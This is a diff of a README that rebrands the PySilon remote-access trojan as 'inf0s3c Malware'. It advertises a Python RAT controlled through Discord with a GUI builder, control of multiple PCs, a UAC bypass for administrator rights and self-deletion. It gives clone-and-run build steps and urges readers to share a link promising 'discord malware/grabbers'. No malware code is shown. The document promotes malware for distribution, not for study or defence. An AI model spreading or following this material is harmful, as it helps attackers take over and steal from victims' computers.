@@ -1,8 +1,6 @@
 <span align='center'>
 
-# `PySilon Malware`
-
-<p align='center'><img src="https://user-images.githubusercontent.com/44233157/205148071-ed0f810e-be71-4b18-8c6b-94e838ebda5d.png" width=500 /></p>
+# `inf0s3c Malware`
 
 `Advanced RAT malware written in Python, fully controllable through Discord with dedicated GUI builder to make preparation easier.`
 
@@ -12,17 +10,7 @@
 
 --------------------
 
-## Wiki
-
-Read our extensive Wiki for more information and detailed building instructions.
-
-[![Wiki](https://img.shields.io/badge/wiki-link-blue?style=for-the-badge&logo=gitbook&logoColor=white)](https://github.com/mategol/PySilon-malware/wiki)
-
-## PySilon Community
-
-Join our Telegram and Discord servers for support, to ask questions, recommend features and talk to like minded people!
-
-[![Telegram - Group](https://img.shields.io/badge/pysilon-community-blue?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/+8razFyklyFw2OWU0)
+# `Do share around this link will be posting discord malware/grabbers soon [inf0s3c Malware](https://github.com/inf0s3clol/inf0s3clol)`
 
 --------------------
 
@@ -44,7 +32,7 @@ Join our Telegram and Discord servers for support, to ask questions, recommend f
 --------------------
 
 # Features
-### PySilon malware can do plenty of things, like:
+### inf0s3c malware can do plenty of things, like:
 - handle multiple PCs (not only one, like in most of the cases)
 - UAC Bypass (gain *Administrative permissions* on startup)
 - **delete itself whenever you want**
@@ -85,9 +73,9 @@ Join our Telegram and Discord servers for support, to ask questions, recommend f
 
 # Preparation<br />
 
-`git clone https://github.com/mategol/pysilon-malware`<br />
-`cd pysilon-malware`<br />
-<a href="https://github.com/mategol/PySilon-malware/wiki/Setup">`Create Discord BOT and server`</a><br />
+`git clone https://github.com/inf0s3clol/inf0s3clol`<br />
+`cd inf0s3clol-malware`<br />
+<a href="https://github.com/inf0s3clol/inf0s3clol">`Create Discord BOT and server`</a><br />
 ***Windows:*** `Run the PySilon.bat either from Command Line or double clicking on it`<br />
 ***Linux:*** `Run the PySilon.sh from Command Line`<br />
 
